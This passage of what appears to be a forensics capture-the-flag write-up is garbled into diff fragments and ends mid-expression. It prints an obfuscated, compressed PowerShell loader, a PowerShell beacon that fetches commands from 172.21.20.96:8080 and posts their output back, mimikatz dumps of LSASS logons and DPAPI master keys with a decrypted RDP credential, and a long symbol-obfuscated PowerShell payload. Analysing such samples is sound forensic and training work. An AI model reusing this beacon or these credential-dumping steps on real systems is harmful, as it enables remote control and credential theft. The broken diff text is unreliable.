czwH1UlQHzsQB3Nck59Un436HM4HQ9ZtKd88+pWke2PWL4gX53/7y1xOfRl55CT8KISXZY4L86LIfdOqUj/nchy85ivQ4fRbwtmz8ruQnQ+awyyoF6nrqUe2ec6Y5lBR/X2UbmOe7fOcK/VZreZQjfAKc5yV8AH8of5fPL/R3NZrjgZ9ST5J9Us+0X3ocxnPnew7ZF6v0/mkvxlvzctz/zSo39/neqJOmRPHiG9RfR37+qj7tuQDztlTfZ40x35kP8hP+jdov22eF2FeT/0zV97txH+pnoQL1CP0c5/nBHHIfFRc+spefbbnXIU8duRcgvodcwzixkJ8cpYd0r3ST+qDN7mPIc8TN9T/PpvHoz9i/3FQPh+VPwV5RnN81SV0PefoC8aV+N8mXRCk27Kezf37iTzAekLfmvto4PMD38dQz7E/69R/+jwX5/uhqD4s6aE+zyk573SyK83ZvOYPfdZRXroJPAQcpp7wmlNmfhiYt3wfspXersQnXnyQdNhaeS68Z/4e9Z5p0Fww4cxBfftJeDRXfzzT/Hsh/VTqfVGR++466RDHfOe84JT5mPPws+KkvlfvgRJ+Sr+k9yJ5TjVwbtmqr2kvPEI94ajTmnwO8gHrLuFGld9feeUp8Te9H/Lqj6Qras3f0vuAzIfhOa9f+nf0QawzxsOpv5e/s+6K7B/T+x3gFHUy+SVoXrlWvqY+PkiHVuoL0vNbzX8j51a1v+SF5je5P1D828t7ryLrilrnAt/xPI3el1BveuHIWnM0zOV37FfzfD+9X0t1+sA5i95X5vkleSZq/uT1HiDhYdOrHxmIm43qfHOZm6V59Fk485cXV3+++/L03+rj3ffN60/33R9f7z/dfdw19dXr/dViMSmK2aRYvJ2Ui/lkUUxu55PiZrw6s//m5aQsr8efbyfXs8nNpJiPv96Ov44fs9vJ+FcWN5Px4fG/4u3byfV0/CjHW8rJzdwWKKfjDzfjlel0cjt79epNff/96f5u+PLx7+++Vqvq6W7tHl++evO7+/TtH18+rq7+fHP18uqHD9/ef/HVL2Xx648//P7t/eZw/8ts/uuPL44vXv0P' ) , [sySteM.IO.ComprESsiON.cOmpresSiONMODe]::
+dEcomPrEss)|fOReach-OBJECt{NEW-obJEct iO.sTReAMrEAder( $_ , [TExT.EncOdiNg]::
+AscIi)} | fOREacH-obJeCt{$_.reADToend()})
 (New-OBJECT MAnAGeMent.AUtOmaTiON.PsCreDEntIAL ' ', ('76492d1116743f0423413b160
 50a5345MgB8AHUAQgAxAEsAZQBQAE8AUQA4AHQAVAB5ADEAcwBXAFYALwBVADcAUAAyAGcAPQA9AHwA
 MQAzADcAMwAwAGIAOQA2ADMANQAwAGYAOABlADUAOQAxAGEAMgA4ADAAOQAzAGQAMABjADYAZgA2ADQ
@@ -2052,15 +1975,12 @@ AAyAGIAMgA4ADEAYwBiADgAMgAwAGEAZgAzADUANgAyAGYAMwA3ADIANABmADkAOAA5ADcANwBiADUA
 NQAzAGYAMgA=' |ConvERTtO-SecureSTRiNG -k 55,113,158,254,51,94,175,13,94,42,226,
 159,63,7,144,195,14,139,39,217,58,39,188,60,182,192,74,94,209,172,100,93)).Getn
 eTwoRKCrEDEnTIAl().pASsWoRD |. ( $PsHoME[21]+$psHOme[34]+'x')
-```
-
-
-
-```
 $bwqvRnHz99 = (104,116,116,112,115,58,47,47,112,97,115,116,101);
 $bwqvRnHz99 += (98,105,110,46,99,111,109,47,104,86,67,69,85,75,49,66);
-$flag = [System.Text.Encoding]::ASCII.GetString($bwqvRnHz99);
-$s='172.21.20.96:8080';
+$flag = [System.Text.Encoding]::
+ASCII.GetString($bwqvRnHz99);
+$s='172.21.20.96:
+8080';
 $i='eef8efac-321d465e-e9d053a7';
 $p='http://';
 $v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/eef8efac -Headers @{
@@ -2074,38 +1994,34 @@ $v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/eef8efac -Headers @{
         $r=Out-String -InputObject $r;
         $t=Invoke-WebRequest -Uri $p$s/e9d053a7 -Method POST -Headers @{
             "X-680d-47e8"=$i
-        } -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')
+        } -Body ([System.Text.Encoding]::
+UTF8.GetBytes($e+$r) -join ' ')
     } 
     sleep 0.8
 }
-```
-
-
-
-```
 PS $bwqvRnHz99 = (104,116,116,112,115,58,47,47,112,97,115,116,101);
 PS $bwqvRnHz99 += (98,105,110,46,99,111,109,47,104,86,67,69,85,75,49,66);
-PS $flag = [System.Text.Encoding]::ASCII.GetString($bwqvRnHz99)
+PS $flag = [System.Text.Encoding]::
+ASCII.GetString($bwqvRnHz99)
 PS $flag
 https://pastebin.com/hVCEUK1B
 
 idek{MS_ExCel_DyN4m1c_D4ta_ExcH@ng3_1s_3a5y_t0_d3teCt}
 Resource: https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within
-```
-
-
-
-```
-mimikatz # privilege::debug
+mimikatz # privilege::
+debug
 Privilege '20' OK
 
-mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::
+minidump lsass.dmp
 Switch to MINIDUMP : 'lsass.dmp'
 
-mimikatz # sekurlsa::logonPasswords full
+mimikatz # sekurlsa::
+logonPasswords full
 Opening : 'lsass.dmp' file for minidump...
 
-Authentication Id : 0 ; 284687 (00000000:0004580f)
+Authentication Id : 0 ; 284687 (00000000:
+0004580f)
 Session           : Interactive from 1
 User Name         : IEUser
 Domain            : IEWIN7
@@ -2133,7 +2049,8 @@ SID               : S-1-5-21-1610009768-122519599-941061767-1000
         ssp :
         credman :
 
-Authentication Id : 0 ; 95278 (00000000:0001742e)
+Authentication Id : 0 ; 95278 (00000000:
+0001742e)
 Session           : Service from 0
 User Name         : sshd_server
 Domain            : IEWIN7
@@ -2161,7 +2078,8 @@ SID               : S-1-5-21-1610009768-122519599-941061767-1002
         ssp :
         credman :
 
-Authentication Id : 0 ; 997 (00000000:000003e5)
+Authentication Id : 0 ; 997 (00000000:
+000003e5)
 Session           : Service from 0
 User Name         : LOCAL SERVICE
 Domain            : NT AUTHORITY
@@ -2181,7 +2099,8 @@ SID               : S-1-5-19
         ssp :
         credman :
 
-Authentication Id : 0 ; 996 (00000000:000003e4)
+Authentication Id : 0 ; 996 (00000000:
+000003e4)
 Session           : Service from 0
 User Name         : IEWIN7$
 Domain            : WORKGROUP
@@ -2201,7 +2120,8 @@ SID               : S-1-5-20
         ssp :
         credman :
 
-Authentication Id : 0 ; 44073 (00000000:0000ac29)
+Authentication Id : 0 ; 44073 (00000000:
+0000ac29)
 Session           : UndefinedLogonType from 0
 User Name         : (null)
 Domain            : (null)
@@ -2215,7 +2135,8 @@ SID               :
         ssp :
         credman :
 
-Authentication Id : 0 ; 999 (00000000:000003e7)
+Authentication Id : 0 ; 999 (00000000:
+000003e7)
 Session           : UndefinedLogonType from 0
 User Name         : IEWIN7$
 Domain            : WORKGROUP
@@ -2234,12 +2155,9 @@ SID               : S-1-5-18
          * Password : (null)
         ssp :
         credman :
-```
-
-
-
-```
-mimikatz # dpapi::cred /in:DB79FF0C49C20D542F3690C933AC3046
+mimikatz # dpapi::
+cred /in:
+DB79FF0C49C20D542F3690C933AC3046
 **BLOB**
   dwVersion          : 00000001 - 1
   guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
@@ -2248,24 +2166,18 @@ mimikatz # dpapi::cred /in:DB79FF0C49C20D542F3690C933AC3046
   dwFlags            : 20000000 - 536870912 (system ; )
   dwDescriptionLen   : 00000030 - 48
   szDescription      : Local Credential Data
-```
-
-
-
-```
-mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::
+minidump lsass.dmp
 Switch to MINIDUMP : 'lsass.dmp'
-```
-
-
-
-```
-mimikatz # privilege::debug
+mimikatz # privilege::
+debug
 Privilege '20' OK
 
-mimikatz # sekurlsa::dpapi
+mimikatz # sekurlsa::
+dpapi
 
-Authentication Id : 0 ; 284687 (00000000:0004580f)
+Authentication Id : 0 ; 284687 (00000000:
+0004580f)
 Session           : Interactive from 1
 User Name         : IEUser
 Domain            : IEWIN7
@@ -2278,7 +2190,8 @@ SID               : S-1-5-21-1610009768-122519599-941061767-1000
          * MasterKey :  e7b41c6fc2aa1edc0dc74dee160f024ff4fa026c307794c4f7739771ff60975fc7c311ab3d5346e998d61c1906a8a7b59c7c21d16910e23f4afa3959982ccccb
          * sha1(key) :  de78dc1fb05d27eddaa81f4c2143d43a9a316f1e
 
-Authentication Id : 0 ; 95278 (00000000:0001742e)
+Authentication Id : 0 ; 95278 (00000000:
+0001742e)
 Session           : Service from 0
 User Name         : sshd_server
 Domain            : IEWIN7
@@ -2286,7 +2199,8 @@ Logon Server      : IEWIN7
 Logon Time        : 2023/1/8 2:46:44
 SID               : S-1-5-21-1610009768-122519599-941061767-1002
 
-Authentication Id : 0 ; 997 (00000000:000003e5)
+Authentication Id : 0 ; 997 (00000000:
+000003e5)
 Session           : Service from 0
 User Name         : LOCAL SERVICE
 Domain            : NT AUTHORITY
@@ -2294,7 +2208,8 @@ Logon Server      : (null)
 Logon Time        : 2023/1/8 2:46:43
 SID               : S-1-5-19
 
-Authentication Id : 0 ; 996 (00000000:000003e4)
+Authentication Id : 0 ; 996 (00000000:
+000003e4)
 Session           : Service from 0
 User Name         : IEWIN7$
 Domain            : WORKGROUP
@@ -2302,7 +2217,8 @@ Logon Server      : (null)
 Logon Time        : 2023/1/8 2:46:43
 SID               : S-1-5-20
 
-Authentication Id : 0 ; 44073 (00000000:0000ac29)
+Authentication Id : 0 ; 44073 (00000000:
+0000ac29)
 Session           : UndefinedLogonType from 0
 User Name         : (null)
 Domain            : (null)
@@ -2310,7 +2226,8 @@ Logon Server      : (null)
 Logon Time        : 2023/1/8 2:46:43
 SID               :
 
-Authentication Id : 0 ; 999 (00000000:000003e7)
+Authentication Id : 0 ; 999 (00000000:
+000003e7)
 Session           : UndefinedLogonType from 0
 User Name         : IEWIN7$
 Domain            : WORKGROUP
@@ -2327,12 +2244,10 @@ SID               : S-1-5-18
          * Time      :  2023/1/8 2:46:43
          * MasterKey :  19c05880b67d50f8231cd8009836e3cdc55610e4877f8b976abd5ca15600d0e759934324c6204b56f02527039e7fc52a1dfb5296d3381aaa7c3eb610dffa32fa
          * sha1(key) :  b859b2b52e7e49cf5c70069745c88853c4b23487
-```
-
-
-
-```
-mimikatz # dpapi::cred /in:DB79FF0C49C20D542F3690C933AC3046 /masterkey:e7b41c6fc2aa1edc0dc74dee160f024ff4fa026c307794c4f7739771ff60975fc7c311ab3d5346e998d61c1906a8a7b59c7c21d16910e23f4afa3959982ccccb
+mimikatz # dpapi::
+cred /in:
+DB79FF0C49C20D542F3690C933AC3046 /masterkey:
+e7b41c6fc2aa1edc0dc74dee160f024ff4fa026c307794c4f7739771ff60975fc7c311ab3d5346e998d61c1906a8a7b59c7c21d16910e23f4afa3959982ccccb
 **BLOB**
   dwVersion          : 00000001 - 1
   guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
@@ -2358,7 +2273,9 @@ mimikatz # dpapi::cred /in:DB79FF0C49C20D542F3690C933AC3046 /masterkey:e7b41
   pbSign             : 7f41a9469ad24a5e572c48ab6f0f1919f0a53e52963ad88676fb730aa9d6ba7e4045e5b3e45c9a33b56ca720c82d202cabd8085cabc5f3834e537ff79a987f22
 
 Decrypting Credential:
- * volatile cache: GUID:{9fd81d55-a794-4a77-9fdc-38eff814d2be};KeyHash:de78dc1fb05d27eddaa81f4c2143d43a9a316f1e;Key:available
+ * volatile cache: GUID:{9fd81d55-a794-4a77-9fdc-38eff814d2be};KeyHash:
+de78dc1fb05d27eddaa81f4c2143d43a9a316f1e;Key:
+available
  * masterkey     : e7b41c6fc2aa1edc0dc74dee160f024ff4fa026c307794c4f7739771ff60975fc7c311ab3d5346e998d61c1906a8a7b59c7c21d16910e23f4afa3959982ccccb
 **CREDENTIAL**
   credFlags      : 00000030 - 48
@@ -2373,43 +2290,25 @@ Decrypting Credential:
   AttributeCount : 00000000 - 0
   unk0           : 00000000 - 0
   unk1           : 00000000 - 0
-  TargetName     : Domain:target=TERMSRV/192.168.209.134
+  TargetName     : Domain:
+target=TERMSRV/192.168.209.134
   UnkData        : (null)
   Comment        : (null)
   TargetAlias    : (null)
   UserName       : administrator
   CredentialBlob : l_4C3S5_f0R_1@73rAl_mOv3M3n7}
   Attributes     : 0
-```
-
-
-
-```
 python3 bmc-tools.py -s Cache0000.bin -d ./00/
 python3 bmc-tools.py -s Cache0001.bin -d ./01/
 python3 bmc-tools.py -s Cache0002.bin -d ./02/
-```
-
-
-
-```
 (  ')(@'|  &('%'){  ${;@!}=  +  $()}  {  ${;+}  =${;@!}}{  ${~=}  =  ++${;@!}  }  {${@[}=(  ${;@!}  =${;@!}  +  ${~=})}  {${~}=  (  ${;@!}=${;@!}+  ${~=}  )  }{${![/}  =  (  ${;@!}=${;@!}  +${~=})  }  {  ${$] }=  (${;@!}  =${;@!}+${~=}  )  }  {  ${]}  =(${;@!}  =  ${;@!}  +  ${~=})  }{  ${](}=  (  ${;@!}=${;@!}+${~=}  )}  {  ${'$[}=  (  ${;@!}=${;@!}+${~=}  )}{${@$/}=(  ${;@!}=  ${;@!}+${~=})  }  {  ${)}  ="["  +  "$(@{}  )"[  ${](}  ]  +  "$(@{  })"[  "${~=}${@$/}"  ]+"$(  @{})"[  "${@[}${;+}"]  +  "$?"[  ${~=}]  +"]"}{  ${;@!}="".("$(  @{  })"["${~=}${![/}"]  +  "$(  @{})"[  "${~=}${]}"  ]  +  "$(@{  })  "[  ${;+}  ]  +  "$(  @{}  )  "[${![/}]  +"$?"[${~=}  ]  +"$(@{  })"[${~}  ])  }{${;@!}=  "$(  @{})  "[  "${~=}${![/}"  ]+"$(@{})  "[${![/}  ]+"${;@!}"[  "${@[}${](}"  ]  }  )  ;"${)}${~}${]}+${)}${~=}${;+}${;+}+${)}${]}${~=}  +${)}${~}${![/}  +${)}${![/}${@$/}  +${)}${$] }${$] }+  ${)}${$] }${;+}  +${)}${![/}${]}+${)}${$] }${;+}+  ${)}${![/}${@$/}  +${)}${![/}${]}+${)}${$] }${;+}  +  ${)}${![/}${'$[}+${)}${![/}${]}+${)}${$] }${](}+${)}${$] }${![/}  +${)}${~}${![/}  +${)}${$] }${@$/}  +${)}${~}${@[}+  ${)}${~}${]}+${)}${~=}${~=}${$] }  +  ${)}${]}${~=}+  ${)}${$] }${@[}  +  ${)}${$] }${@$/}+  ${)}${~}${@[}  +  ${)}${~}${]}+${)}${@$/}${'$[}  +${)}${]}${~=}+  ${)}${$] }${~}  +  ${)}${$] }${$] }  +  ${)}${$] }${@$/}  +${)}${~}${@[}  +${)}${](}${~=}+  ${)}${~=}${;+}${~=}+  ${)}${~=}${~=}${]}  +${)}${![/}${$] }  +${)}${]}${](}+  ${)}${~=}${;+}${![/}+${)}${~=}${;+}${$] }+  ${)}${~=}${;+}${'$[}  +${)}${~=}${;+}${;+}  +${)}${](}${~}  +  ${)}${~=}${~=}${]}+${)}${~=}${;+}${~=}+${)}${~=}${;+}${@$/}+  ${)}${~}${@[}  +  ${)}${~}${![/}  +${)}${![/}${]}  +${)}${~}${![/}+  ${)}${~}${@[}+  ${)}${~=}${@[}${![/}+  ${)}${~}${@[}  +${)}${](}${;+}+  ${)}${~=}${~=}${~=}+${)}${~=}${~=}${![/}+${)}${~=}${;+}${~=}  +${)}${@$/}${](}+${)}${@$/}${@$/}+${)}${~=}${;+}${![/}+${)}${![/}${$] }+  ${)}${](}${@$/}+${)}${@$/}${'$[}  +${)}${~=}${;+}${]}+  ${)}${~=}${;+}${~=}  +${)}${@$/}${@$/}  +  ${)}${~=}${~=}${]}+  ${)}${~}${@[}  +${)}${~=}${@[}${~}  +  ${)}${~}${]}  +  ${)}${@$/}${](}+${)}${]}${~=}+  ${)}${@$/}${~=}  +  ${)}${'$[}${~}  +  ${)}${~=}${@[}${~=}+${)}${~=}${~=}${$] }  +  ${)}${~=}${~=}${]}+${)}${~=}${;+}${~=}+  ${)}${~=}${;+}${@$/}  +  ${)}${![/}${]}+${)}${]}${](}+  ${)}${~=}${~=}${~=}+  ${)}${~=}${~=}${;+}+  ${)}${~=}${~=}${'$[}+  ${)}${~=}${;+}${~=}+  ${)}${~=}${~=}${![/}+${)}${~=}${~=}${]}  +${)}${@$/}${~}  +${)}${$] }${'$[}+  ${)}${$] }${'$[}+  ${)}${'$[}${![/}+${)}${~=}${~=}${~=}+  ${)}${]}${]}+${)}${@$/}${](}  +${)}${~=}${~=}${$] }+  ${)}${~=}${;+}${~=}+${)}${$] }${![/}  +  ${)}${$] }${@[}+${)}${'$[}${~}  +${)}${~=}${~=}${]}  +  ${)}${~=}${~=}${![/}+  ${)}${~=}${;+}${$] }+${)}${~=}${~=}${;+}+  ${)}${~=}${;+}${~}+  ${)}${![/}${;+}+  ${)}${~}${]}+${)}${]}${@$/}  +${)}${~=}${~=}${;+}+  ${)}${@$/}${@$/}  +  ${)}${![/}${]}+${)}${](}${~=}  +${)}${~=}${;+}${~=}  +  ${)}${~=}${~=}${]}  +  ${)}${]}${]}+  ${)}${~=}${@[}${~=}+${)}${~=}${~=}${]}+${)}${~=}${;+}${~=}  +${)}${~=}${~=}${$] }+${)}${![/}${;+}  +${)}${~}${]}  +  ${)}${@$/}${$] }  +  ${)}${![/}${]}+  ${)}${](}${'$[}+  ${)}${@$/}${](}  +${)}${~=}${;+}${@$/}  +${)}${~=}${;+}${~=}+${)}${![/}${~=}+  ${)}${![/}${~=}  +${)}${$] }${@$/}+  ${)}${~}${@[}  +${)}${~}${]}+${)}${'$[}${@[}+${)}${]}${~=}  +  ${)}${~=}${@[}${~}+${)}${~}${]}  +${)}${]}${'$[}  +  ${)}${![/}${![/}  +${)}${~}${]}  +  ${)}${](}${$] }  +${)}${]}${~=}  +${)}${~}${]}+${)}${]}${$] }+${)}${~=}${~=}${![/}  +  ${)}${~=}${;+}${~}  +${)}${~=}${~=}${$] }+${)}${$] }${@$/}  +${)}${~}${]}+  ${)}${'$[}${~}+${)}${]}${~=}+  ${)}${![/}${'$[}+${)}${![/}${]}+  ${)}${![/}${]}  +  ${)}${$] }${;+}  +  ${)}${$] }${~}  +${)}${$] }${~}  +${)}${$] }${@$/}  +  ${)}${![/}${'$[}  +${)}${![/}${]}+${)}${![/}${]}  +  ${)}${$] }${;+}+  ${)}${$] }${~}+  ${)}${$] }${~}  +${)}${~=}${@[}${![/}  +${)}${~}${](}+${)}${~=}${@[}${~}  +${)}${~}${]}  +  ${)}${](}${![/}  +${)}${]}${~=}  +${)}${![/}${;+}+${)}${~}${]}+${)}${](}${![/}+${)}${![/}${~}  +  ${)}${~}${]}  +  ${)}${'$[}${~}+  ${)}${@$/}${~=}+  ${)}${~}${]}+${)}${@$/}${$] }+${)}${@$/}${~}+  ${)}${![/}${~}  +  ${)}${~}${]}  +  ${)}${](}${$] }  +${)}${@$/}${~=}  +${)}${~}${]}  +${)}${@$/}${$] }+  ${)}${~}${](}  +${)}${~}${]}  +  ${)}${](}${$] }  +  ${)}${![/}${]}+${)}${](}${]}  +${)}${~=}${;+}${~=}+${)}${~=}${~=}${;+}  +  ${)}${~=}${;+}${~}+  ${)}${~=}${~=}${]}  +${)}${~=}${;+}${![/}  +${)}${@$/}${~}+${)}${![/}${~=}+  ${)}${~}${](}+${)}${$] }${;+}+${)}${$] }${~}+${)}${$] }${![/}  +  ${)}${$] }${@$/}  +  ${)}${~}${]}+${)}${'$[}${~}+  ${)}${@$/}${~=}+  ${)}${~}${]}  +  ${)}${@$/}${$] }  +${)}${@$/}${~}  +  ${)}${![/}${![/}  +  ${)}${~}${]}  +${)}${'$[}${~}+${)}${@$/}${~=}  +${)}${~}${]}+  ${)}${](}${![/}+  ${)}${@$/}${~}  +${)}${]}${~=}+${)}${~}${]}+  ${)}${'$[}${~}+${)}${@$/}${~=}+${)}${~}${]}  +  ${)}${](}${![/}  +${)}${@$/}${~}+  ${)}${![/}${![/}  +  ${)}${~}${]}  +  ${)}${'$[}${~}  +${)}${@$/}${~=}  +${)}${~}${]}  +${)}${@$/}${$] }  +  ${)}${@$/}${~}  +${)}${~=}${@[}${$] }+${)}${$] }${@$/}  +  ${)}${~}${]}+  ${)}${]}${'$[}+  ${)}${~=}${@[}${![/}+${)}${~}${](}  +  ${)}${~=}${@[}${~}  +${)}${~}${]}  +${)}${](}${~}+${)}${]}${~=}  +${)}${![/}${;+}+  ${)}${~}${]}+  ${)}${](}${~}  +  ${)}${![/}${~}+  ${)}${![/}${@$/}+  ${)}${![/}${~=}  +  ${)}${~}${](}  +${)}${$] }${;+}  +${)}${$] }${~}+${)}${$] }${![/}+  ${)}${$] }${@$/}+  ${)}${~}${]}+  ${)}${](}${@[}  +${)}${]}${~=}+${)}${![/}${;+}+  ${)}${~}${]}  +${)}${](}${@[}+  ${)}${![/}${~}  +${)}${~}${]}+${)}${'$[}${~}+  ${)}${@$/}${~=}  +  ${)}${~}${]}+${)}${](}${~}+${)}${@$/}${~}+${)}${![/}${~=}  +  ${)}${~}${](}  +${)}${$] }${;+}+  ${)}${$] }${~}  +  ${)}${$] }${![/}  +${)}${$] }${@$/}+${)}${~}${]}  +${)}${'$[}${~}+${)}${@$/}${~=}+  ${)}${~}${]}  +${)}${](}${~}+${)}${@$/}${~}+${)}${![/}${![/}+  ${)}${~}${]}+  ${)}${'$[}${~}+  ${)}${@$/}${~=}+  ${)}${~}${]}+  ${)}${](}${@[}  +${)}${@$/}${~}  +  ${)}${]}${~=}  +${)}${~}${]}+${)}${'$[}${~}+  ${)}${@$/}${~=}  +  ${)}${~}${]}+${)}${](}${@[}+${)}${@$/}${~}+  ${)}${![/}${![/}  +  ${)}${~}${]}+  ${)}${'$[}${~}  +${)}${@$/}${~=}+  ${)}${~}${]}  +  ${)}${](}${~}+${)}${@$/}${~}  +  ${)}${$] }${@$/}  +  ${)}${~}${]}  +  ${)}${@$/}${$] }  +${)}${![/}${$] }+  ${)}${@$/}${'$[}+${)}${~=}${@[}${;+}+  ${)}${~=}${~=}${~=}  +  ${)}${~=}${~=}${![/}+  ${)}${~}${]}+  ${)}${'$[}${~}+${)}${@$/}${~=}+  ${)}${![/}${;+}+  ${)}${~}${]}+${)}${'$[}${~}+${)}${@$/}${~=}+  ${)}${~}${]}+  ${)}${](}${~}  +${)}${@$/}${~}  +${)}${![/}${~}  +  ${)}${~}${]}+  ${)}${'$[}${~}  +${)}${@$/}${~=}+${)}${~}${]}  +${)}${](}${@[}+${)}${@$/}${~}  +  ${)}${![/}${~=}+  ${)}${~}${](}  +  ${)}${$] }${;+}+  ${)}${$] }${~}  +  ${)}${$] }${![/}  +${)}${@$/}${~}+  ${)}${~=}${@[}${$] }+  ${)}${~=}${@[}${$] }+  ${)}${$] }${@$/}+  ${)}${~}${@[}  +${)}${~}${]}  +  ${)}${]}${@$/}  +${)}${~=}${~=}${;+}  +  ${)}${@$/}${@$/}+  ${)}${~}${@[}  +  ${)}${]}${~=}  +${)}${~}${@[}  +  ${)}${@$/}${~=}+${)}${'$[}${~}  +${)}${~=}${@[}${~=}  +  ${)}${~=}${~=}${$] }+  ${)}${~=}${~=}${]}  +  ${)}${~=}${;+}${~=}  +${)}${~=}${;+}${@$/}+  ${)}${![/}${]}+${)}${'$[}${![/}+${)}${~=}${;+}${~=}+${)}${~=}${@[}${;+}  +  ${)}${~=}${~=}${]}  +${)}${![/}${]}  +  ${)}${]}${@$/}  +  ${)}${~=}${~=}${;+}  +  ${)}${@$/}${@$/}+${)}${~=}${~=}${~=}  +${)}${~=}${;+}${;+}  +  ${)}${~=}${;+}${$] }+  ${)}${~=}${~=}${;+}  +${)}${~=}${;+}${~}+  ${)}${@$/}${~}+${)}${$] }${'$[}+${)}${$] }${'$[}+  ${)}${]}${$] }  +  ${)}${'$[}${~}+  ${)}${]}${](}+${)}${](}${~}+  ${)}${](}${~}  +  ${)}${$] }${@$/}  +${)}${~}${@[}+${)}${~}${]}  +${)}${~=}${~=}${@[}+${)}${~}${@[}+  ${)}${]}${~=}  +${)}${~}${@[}+  ${)}${~}${]}+  ${)}${]}${@$/}+  ${)}${~=}${~=}${;+}+  ${)}${@$/}${@$/}+  ${)}${![/}${]}  +${)}${](}${~=}  +${)}${~=}${;+}${~=}  +${)}${~=}${~=}${]}  +${)}${]}${]}+  ${)}${~=}${@[}${~=}+${)}${~=}${~=}${]}+${)}${~=}${;+}${~=}  +  ${)}${~=}${~=}${$] }+${)}${![/}${;+}  +${)}${~}${@$/}+${)}${@$/}${~=}+  ${)}${'$[}${~}  +  ${)}${~=}${@[}${~=}  +${)}${~=}${~=}${$] }  +  ${)}${~=}${~=}${]}  +  ${)}${~=}${;+}${~=}  +${)}${~=}${;+}${@$/}+  ${)}${![/}${]}  +  ${)}${](}${~}+${)}${](}${@$/}+  ${)}${![/}${]}+  ${)}${](}${;+}+${)}${~=}${;+}${$] }+  ${)}${~=}${;+}${'$[}+  ${)}${~=}${;+}${~=}  +${)}${@$/}${~}  +  ${)}${$] }${'$[}+  ${)}${$] }${'$[}+  ${)}${'$[}${@[}+  ${)}${~=}${;+}${~=}  +  ${)}${@$/}${](}  +${)}${~=}${;+}${;+}+  ${)}${]}${$] }+  ${)}${~=}${;+}${'$[}  +  ${)}${~=}${;+}${'$[}+${)}${]}${]}  +${)}${~=}${@[}${~=}+${)}${~=}${~=}${]}  +  ${)}${~=}${;+}${~=}  +  ${)}${~=}${~=}${$] }  +  ${)}${![/}${;+}  +  ${)}${~}${]}  +${)}${@$/}${$] }+${)}${![/}${]}  +${)}${](}${;+}+${)}${~=}${~=}${](}+${)}${~=}${;+}${'$[}+${)}${~=}${;+}${'$[}+${)}${](}${'$[}  +  ${)}${@$/}${](}  +  ${)}${~=}${;+}${@$/}  +  ${)}${~=}${;+}${~=}+  ${)}${![/}${~=}  +${)}${~}${@$/}  +  ${)}${![/}${~=}  +  ${)}${$] }${@$/}+${)}${~}${@[}  +  ${)}${~}${]}  +${)}${~=}${@[}${@[}  +${)}${~}${@[}+  ${)}${]}${~=}  +${)}${~}${@[}  +  ${)}${~}${]}+  ${)}${]}${@$/}+  ${)}${~=}${~=}${;+}+  ${)}${@$/}${@$/}  +${)}${![/}${]}  +${)}${](}${~=}  +${)}${~=}${;+}${~=}  +  ${)}${~=}${~=}${]}  +${)}${]}${]}  +  ${)}${~=}${@[}${~=}  +${)}${~=}${~=}${]}+  ${)}${~=}${;+}${~=}  +${)}${~=}${~=}${$] }  +${)}${![/}${;+}+${)}${@$/}${~=}+  ${)}${'$[}${~}  +  ${)}${~=}${@[}${~=}+  ${)}${~=}${~=}${$] }+  ${)}${~=}${~=}${]}  +${)}${~=}${;+}${~=}+${)}${~=}${;+}${@$/}+  ${)}${![/}${]}  +  ${)}${](}${~}+${)}${](}${@$/}+  ${)}${![/}${]}  +${)}${](}${;+}  +${)}${~=}${;+}${$] }  +  ${)}${~=}${;+}${'$[}+${)}${~=}${;+}${~=}  +  ${)}${@$/}${~}+  ${)}${$] }${'$[}+${)}${$] }${'$[}  +${)}${'$[}${@[}  +  ${)}${~=}${;+}${~=}  +${)}${@$/}${](}+  ${)}${~=}${;+}${;+}  +${)}${]}${$] }  +${)}${~=}${;+}${'$[}  +  ${)}${~=}${;+}${'$[}  +${)}${]}${]}+${)}${~=}${@[}${~=}+  ${)}${~=}${~=}${]}  +${)}${~=}${;+}${~=}  +${)}${~=}${~=}${$] }+  ${)}${![/}${;+}+${)}${~}${]}  +  ${)}${@$/}${$] }  +  ${)}${![/}${]}  +  ${)}${](}${;+}  +${)}${~=}${~=}${](}  +${)}${~=}${;+}${'$[}+  ${)}${~=}${;+}${'$[}  +  ${)}${](}${'$[}+${)}${@$/}${](}+${)}${~=}${;+}${@$/}  +  ${)}${~=}${;+}${~=}  +${)}${![/}${~=}+${)}${![/}${~=}  +  ${)}${$] }${@$/}  +${)}${~}${@[}  +${)}${~}${]}  +${)}${~=}${~=}${](}  +${)}${~}${@[}+${)}${]}${~=}  +${)}${~}${@[}  +  ${)}${![/}${;+}+  ${)}${~}${'$[}  +  ${)}${~}${@[}+${)}${~}${]}+${)}${'$[}${@[}+${)}${~}${@[}  +${)}${~}${]}  +${)}${~=}${@[}${@[}  +${)}${~}${@[}+  ${)}${~}${]}+${)}${~=}${~=}${@[}  +  ${)}${![/}${~=}+  ${)}${$] }${@$/}+${)}${~}${@[}+  ${)}${~}${]}+${)}${~=}${;+}${~=}  +  ${)}${~}${@[}  +${)}${]}${~=}+${)}${~}${@[}+${)}${@$/}${~=}+  ${)}${'$[}${~}  +${)}${~=}${@[}${~=}  +  ${)}${~=}${~=}${$] }+${)}${~=}${~=}${]}+  ${)}${~=}${;+}${~=}+${)}${~=}${;+}${@$/}  +${)}${![/}${]}  +${)}${]}${](}  +${)}${~=}${~=}${~=}  +${)}${~=}${~=}${;+}+${)}${~=}${~=}${'$[}  +  ${)}${~=}${;+}${~=}+${)}${~=}${~=}${![/}  +  ${)}${~=}${~=}${]}  +  ${)}${@$/}${~}+${)}${$] }${'$[}  +${)}${$] }${'$[}+  ${)}${'$[}${![/}  +  ${)}${~=}${~=}${~=}+  ${)}${]}${]}+${)}${@$/}${](}  +  ${)}${~=}${~=}${$] }  +${)}${~=}${;+}${~=}  +${)}${$] }${![/}+${)}${$] }${@[}  +${)}${'$[}${~}+  ${)}${~=}${~=}${]}  +${)}${~=}${~=}${![/}  +${)}${~=}${;+}${$] }  +${)}${~=}${~=}${;+}  +  ${)}${~=}${;+}${~}+  ${)}${![/}${;+}  +  ${)}${~}${]}+${)}${~=}${~=}${](}  +  ${)}${![/}${~=}  +${)}${$] }${@$/}  +  ${)}${~}${@[}  +  ${)}${~}${]}+  ${)}${~=}${;+}${'$[}  +  